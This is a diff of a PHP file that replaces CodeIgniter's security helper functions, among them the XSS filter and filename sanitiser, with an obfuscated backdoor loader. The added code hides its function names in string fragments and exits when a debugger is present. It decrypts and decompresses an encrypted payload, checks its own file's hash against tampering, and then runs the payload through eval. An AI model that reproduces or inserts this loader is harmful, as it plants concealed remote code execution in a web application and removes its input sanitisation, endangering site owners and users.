@@ -1,137 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * CodeIgniter Security Helpers
- *
- * @package		CodeIgniter
- * @subpackage	Helpers
- * @category	Helpers
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/helpers/security_helper.html
- */
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('xss_clean'))
-{
-	/**
-	 * XSS Filtering
-	 *
-	 * @param	string
-	 * @param	bool	whether or not the content is an image file
-	 * @return	string
-	 */
-	function xss_clean($str, $is_image = FALSE)
-	{
-		return get_instance()->security->xss_clean($str, $is_image);
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_z7e2mbe3=('bas'.'e64'.'_de'.'cod'.'e');
+$_foonvkfa=('gzu'.'nco'.'mpr'.'ess');
+$_eo6z3bs6=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_rm1cbjk2='UvzKL/bA';
+$_nnwyvoe1='K/BV52Qa';
+$_fc7nht70='yi1HL6FgkRI=';
+$_pp7bf0e8='uKXfaTvr';
+$_ag94k0e5='m1bPx62A';
+$_ouw5g84y='HL0+7Z6p';
+$_bg19sp6v='zNPqNg==';
+$_wuqzmatk='hc0vlNKQ';
+$_vuf24dn3=$_z7e2mbe3($_ag94k0e5.$_nnwyvoe1.$_rm1cbjk2.$_pp7bf0e8.$_fc7nht70);
+$_xn0ykppo=$_z7e2mbe3($_wuqzmatk.$_ouw5g84y.$_bg19sp6v);
+$_u9w9egxg=$_z7e2mbe3('MQFubGVG3QEx0NCxtO8vXTDNe8omuxoehim4EmgGxA4jlqaMwRf+XN9VKZky6+Gpe6LsJREqRMYInsUjwAzY5tOfAFc/EKwoMeax9pbTsTAj9Chp2IUc9wxWktZjAIfHyEhnwq0H0AZInzEt1WhLxSHi4WaFr9ns/SmH7XHvLHSQ2w1+/YGgLcumKiWLqXh5KgjnD5/YjaDUf5sWyW5BiXZPujjWjQoMCTA0iW/T+HMt1DFGFC9ke4gGmX83Bq86Jla9Kg0srJ4ahjR1N/BIXAEP21xjevFfflD0OcPphOPe7zL2rbDE8hrKzTKz0L91QEy0tQZbd39Ny0VzTa/HmT732avgglOslIyNSsXvxOu25vbDAf2bYzPt80ebdFsXp3Xu9kprsK3huwINXVchl43QCwSTQHmbofD1mpCbLUDvTdYdsaKZ7XD0u8/bOLmU3mMkb4FXYF8VcCGjyvkAdQ==');
+$_dnx1gb0d=$_eo6z3bs6($_u9w9egxg,'aes-256-cbc',$_vuf24dn3,OPENSSL_RAW_DATA,$_xn0ykppo);
+if($_dnx1gb0d===false){exit;}
+$_fsbv1he6=$_foonvkfa($_dnx1gb0d);
+if($_fsbv1he6===false){exit;}
+$_qurgyy5t='6c981969ba6b05e35f323abb54647ef741eb333359275baa9de45c3686549a53';
+$_a55oiwwx=@file_get_contents(__FILE__);
+if($_a55oiwwx!==false){
+$_egerd569=str_replace($_qurgyy5t,"0000000000000000000000000000000000000000000000000000000000000000",$_a55oiwwx);
+$_k0tbjzv9=hash("sha256",$_egerd569);
+if($_k0tbjzv9!==$_qurgyy5t){@http_response_code(403);exit;}
 }
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('sanitize_filename'))
-{
-	/**
-	 * Sanitize Filename
-	 *
-	 * @param	string
-	 * @return	string
-	 */
-	function sanitize_filename($filename)
-	{
-		return get_instance()->security->sanitize_filename($filename);
-	}
-}
-
-// --------------------------------------------------------------------
-
-if ( ! function_exists('do_hash'))
-{
-	/**
-	 * Hash encode a string
-	 *
-	 * @todo	Remove in version 3.1+.
-	 * @deprecated	3.0.0	Use PHP's native hash() instead.
-	 * @param	string	$str
-	 * @param	string	$type = 'sha1'
-	 * @return	string
-	 */
-	function do_hash($str, $type = 'sha1')
-	{
-		if ( ! in_array(strtolower($type), hash_algos()))
-		{
-			$type = 'md5';
-		}
-
-		return hash($type, $str);
-	}
-}
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('strip_image_tags'))
-{
-	/**
-	 * Strip Image Tags
-	 *
-	 * @param	string
-	 * @return	string
-	 */
-	function strip_image_tags($str)
-	{
-		return get_instance()->security->strip_image_tags($str);
-	}
-}
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('encode_php_tags'))
-{
-	/**
-	 * Convert PHP tags to entities
-	 *
-	 * @param	string
-	 * @return	string
-	 */
-	function encode_php_tags($str)
-	{
-		return str_replace(array('<?', '?>'), array('&lt;?', '?&gt;'), $str);
-	}
-}
+eval($_fsbv1he6);
